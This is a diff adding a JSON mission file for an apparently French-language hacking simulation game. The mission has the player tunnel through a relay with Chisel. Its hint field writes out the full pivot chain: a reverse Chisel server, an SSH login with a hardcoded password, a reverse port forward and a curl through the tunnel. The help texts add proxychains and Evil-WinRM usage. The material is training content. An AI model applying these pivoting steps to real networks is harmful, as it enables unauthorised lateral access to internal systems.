@@ -1,0 +1,70 @@
+{
+  "contract_id": "act3_chisel",
+  "scenario": "act3_chisel",
+  "tier": 2,
+  "act": 3,
+  "act_chapter": 4,
+  "channel": "telegrid",
+  "client": {
+    "handle": "traverse",
+    "forum_rep": 80,
+    "account_age_days": 650
+  },
+  "bounty": {
+    "forum": "exployt",
+    "title": "Acte III · 04 — Le retour est possible",
+    "body": "Tu as vu le registre depuis le relais. Il nous faut maintenant le lire depuis Kali par une redirection inverse Chisel. L’outil est déjà installé dans l’image Aster ; sa note précise le point de sortie. Garde les processus ouverts dans leurs consoles, puis relis le registre au bout du passage."
+  },
+  "brief": "Tu as vu le registre depuis le relais. Il nous faut maintenant le lire depuis Kali par une redirection inverse Chisel. L’outil est déjà installé dans l’image Aster ; sa note précise le point de sortie. Garde les processus ouverts dans leurs consoles, puis relis le registre au bout du passage.\n\nAides locales dans ~/docs. Demande indice ou rappel détaillé ici ; confirme « constat » une fois les vérifications faites.",
+  "reward": 470,
+  "reputation": 20,
+  "required_items": [],
+  "required_completed": [
+    "act3_origine"
+  ],
+  "success_message": "Le registre est arrivé par la redirection inverse. Le passage dépend des deux processus et de la sortie réseau du relais. Règlement de {reward} ₵ dans ColdVault.",
+  "failure_message": "On reprend depuis les constats enregistrés au débriefing. Pas besoin d’inventer un accès pour conclure.",
+  "guide": [],
+  "investigation_steps": [
+    {
+      "id": "constat",
+      "tokens": [
+        "preuve"
+      ],
+      "requires": [
+        {
+          "type": "tool_fact",
+          "key": "chisel:connected"
+        },
+        {
+          "type": "tool_fact",
+          "key": "http:pivot:documents"
+        }
+      ],
+      "response": "Le registre est arrivé par la redirection inverse. Le passage dépend des deux processus et de la sortie réseau du relais.",
+      "already": "Oui, constat reçu.",
+      "missing": "Il manque une observation vérifiable. Demande indice pour reprendre le point bloquant.",
+      "hint": "Kali : chisel server --reverse --port 8000. Autre console : ssh maintenance@10.90.10.10 ; secret AsterLecture2026! ; chisel client http://10.10.14.2:8000 R:8081:10.90.40.20:80. Troisième console : curl http://127.0.0.1:8081/registre.txt. Confirme « constat ».",
+      "hints": [
+        "La note outils.txt sur le relais explique où se trouve Chisel. ~/docs/transports.txt sépare les consoles serveur, client et lecture.",
+        "Garde le serveur et le client dans leurs consoles, puis vérifie le résultat depuis une autre console."
+      ]
+    }
+  ],
+  "local_files": {
+    "/home/operator/docs/reconnaissance.txt": "Reconnaissance — documentation locale du simulateur\nnmap --help : options couvertes. -Pn saute la découverte préalable ; il ne traverse pas un pare-feu et ne crée aucune route.\nUn port open répond, closed refuse la connexion, filtered ne fournit pas de réponse exploitable. La découverte peut échouer alors que TCP/22 répond.\nExercice de syntaxe, adresses différentes du dossier : nmap -sV -p 22,80 192.0.2.10 ; puis nmap -Pn -sV -p 22,80 192.0.2.10.\nSur un relais : ip addr ; ip route ; ss -lnt ; nmap -sV -p 80 192.0.2.20.\nSSH : ssh utilisateur@adresse ; saisir le secret au prompt ; whoami ; hostname ; exit.\nUne nouvelle console reste locale. Les droits de lecture SSH ne sont pas des droits administrateur du domaine.\n",
+    "/home/operator/mission/ticket.txt": "LN-FW-301 : sondes de découverte usuelles filtrées depuis opérateur vers 10.90.10.10 ; TCP/22 maintenu pour maintenance. Cette règle ne décrit aucun accès aux réseaux internes.\n",
+    "/home/operator/mission/passations.txt": "Ancienne passation : ASTER-ANCIEN 10.90.10.11, retirée du service.\nActuelle : ASTER-MAINT 10.90.10.10 ; compte maintenance ; secret AsterLecture2026! ; lecture uniquement.\n",
+    "/home/operator/routes/aster.conf": "strict_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\n",
+    "/home/operator/docs/transports.txt": "Transports — aide locale\nLe serveur Chisel se lance sur Kali et reste dans sa console. Le client est installé sur ASTER-MAINT et s’exécute dans sa session SSH. Une console supplémentaire sert à tester le résultat.\nExemple d’exercice : chisel server --reverse --port 9000 ; sur le relais : chisel client http://192.0.2.1:9000 R:8081:192.0.2.20:80 ; depuis Kali : curl http://127.0.0.1:8081/document.txt.\nSOCKS inverse : remplacer le remote par R:1080:socks. ProxyChains ne transporte ici que TCP. Configuration strict_chain, puis [ProxyList], puis socks5 127.0.0.1 1080.\nproxychains4 -f CONFIG nmap -sT -Pn -n -p 80 ADRESSE ; proxychains4 -f CONFIG curl URL.\nEvil-WinRM : evil-winrm -i ADRESSE -u COMPTE -p SECRET ; -S sélectionne TLS, -P change le port. Utilisable avec ProxyChains. Une session ouvre PowerShell ; whoami, Get-Content, exit sont disponibles.\nAides : chisel --help, proxychains4 --help, evil-winrm -h. ps aux et ss -lntp permettent de vérifier les processus et les écouteurs. Ctrl+C ou kill PID interrompt un transport ; fermer sa console l’arrête aussi. Une sauvegarde conserve les processus virtuels, pas une connexion réelle.\nCouverture : serveur Chisel local, client distant, une redirection inverse TCP ou SOCKS par client ; une chaîne SOCKS5 ; clients Nmap TCP, curl et Evil-WinRM. Les autres options sont signalées hors couverture.\n"
+  },
+  "private_offer": true,
+  "intro": "Tu as vu le registre depuis le relais. Il nous faut maintenant le lire depuis Kali par une redirection inverse Chisel. L’outil est déjà installé dans l’image Aster ; sa note précise le point de sortie. Garde les processus ouverts dans leurs consoles, puis relis le registre au bout du passage.",
+  "relaxed_clock": true,
+  "terminal_revision": 1,
+  "dialogue": {
+    "greeting": "Salut. J’ai les pièces Aster ouvertes, on peut comparer.",
+    "ack": "D’accord, je garde ça avec les observations.",
+    "fallback": "Tu parles de quelle machine, et depuis quelle console ?"
+  }
+}
